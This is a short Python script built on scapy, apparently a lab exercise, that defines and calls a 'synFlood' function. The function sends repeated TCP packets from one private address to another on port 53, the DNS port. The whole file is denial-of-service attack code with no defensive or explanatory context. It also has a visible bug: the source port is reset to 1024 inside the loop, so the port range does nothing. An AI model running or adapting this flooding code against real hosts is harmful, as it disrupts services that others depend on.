from scapy.all import *
from scapy.layers.inet import TCP, IP
import time

src = "192.168.222.1"
tgt = "192.168.222.2"

def synFlood():

    for sport in range(1024, 1100):
        sport = 1024
        L3 = IP(src=src, dst=tgt)

        L4 = TCP(sport=sport, dport=53)

        pkt = L3 / L4

        send(pkt)
        print(sport)
        time.sleep(0.1)
synFlood()
